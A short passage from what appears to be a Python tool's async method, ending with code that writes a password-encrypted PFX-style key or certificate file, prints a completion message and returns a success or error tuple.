					encryption_algorithm=BestAvailableEncryption(pfx_password.encode())
				)
				f.write(data)
	
			await self.print('[+] Finished!')
			return True, None
		except Exception as e:
			return False, e